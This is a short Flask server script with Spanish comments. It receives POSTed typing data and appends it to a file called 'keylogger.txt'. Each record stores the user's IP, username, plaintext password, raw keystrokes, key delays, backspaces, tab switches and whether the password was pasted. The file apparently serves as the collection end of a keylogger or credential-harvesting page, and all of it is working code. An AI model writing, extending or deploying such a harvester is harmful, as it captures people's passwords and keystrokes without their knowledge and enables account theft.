from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/_api_/', methods=['POST'])
def log_behavior():
    d = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Construir el mensaje de log
    log_entry = (
        "\n>> Registro de actividad detectado:\n"
        f"Fecha: {datetime.now()}\n"
        f"IP: {ip}\n"
        f"Usuario: {d.get('u')}\n"
        f"Clave: {d.get('c')}\n"
        f"Teclas: {d.get('t')}\n"
        f"Tiempo Total: {d.get('tt')} ms\n"
        f"Backspaces: {d.get('b')}\n"
        f"Cambios de pestañas: {d.get('vc')}\n"
        f"¿Pegó la clave?: {'Sí' if d.get('pc') else 'No'}\n"
        f"Key Delays: {d.get('kd')}\n"
        "------------------------------------------\n"
    )

    # Mostrar en consola
    print(log_entry)

    # Guardar en archivo
    with open('keylogger.txt', 'a', encoding='utf-8') as f:
        f.write(log_entry)

    return '', 204

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5050)